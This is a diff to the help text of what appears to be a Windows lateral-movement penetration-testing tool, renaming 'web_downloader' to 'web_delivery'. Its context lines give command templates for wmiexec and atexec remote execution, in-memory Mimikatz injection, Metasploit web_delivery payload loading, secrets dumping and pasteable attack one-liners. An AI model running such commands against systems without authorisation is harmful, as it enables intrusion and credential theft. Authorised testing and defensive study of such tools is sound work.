@@ -4215,7 +4215,7 @@ WMIEXEC Command Execution:
     %(prog)s [-u Administrator] [-p Password1] [-d Domain] [-t target] --wmiexec -c "Net User"
 WMIEXEC PowerShell Mimikatz Memory Injector:
     %(prog)s [-u Administrator] [-p Password1] [-d Domain] [-t target] --wmiexec --invoker
-WMIEXEC Metasploit web_downloader Memory Injector:
+WMIEXEC Metasploit web_delivery Memory Injector:
     %(prog)s [-u Administrator] [-p Password1] [-d Domain] [-t target] --wmiexec --downloader
 WMIEXEC Custom Code Memory Injector:
     %(prog)s [-u Administrator] [-p Password1] [-d Domain] [-t target] --wmiexec --executor -c "binary.exe"
@@ -4223,7 +4223,7 @@ ATEXEC Command Execution:
     %(prog)s [-u Administrator] [-p Password1] [-d Domain] [-t target] --atexec -c "Net User" --no-encoder
 ATEXEC PowerShell Mimikatz Memory Injector:
     %(prog)s [-u Administrator] [-p Password1] [-d Domain] [-t target] --wmiexec --invoker --no-encoder
-ATEXEC Metasploit web_downloader Memory Injector:
+ATEXEC Metasploit web_delivery Memory Injector:
     %(prog)s [-u Administrator] [-p Password1] [-d Domain] [-t target] --wmiexec --downloader --no-encoder
 ATEXEC Custom Code Memory Injector:
     %(prog)s [-u Administrator] [-p Password1] [-d Domain] [-t target] --wmiexec --executor -c "binary.exe" --no-encoder
@@ -4231,7 +4231,7 @@ SECRETSDUMP Custom Code Memory Injector:
     %(prog)s [-u Administrator] [-p Password1] [-d Domain] [-t target] --secrets-dump
 Create Pasteable Mimikatz Attack:
     %(prog)s --invoker -q -v -vv -vvv
-Create Pasteable web_downloader Attack:
+Create Pasteable web_delivery Attack:
     %(prog)s --downloader -q -v -vv -vvv
 Create Pasteable Executor Attack:
     %(prog)s --executor -q -v -vv -vvv
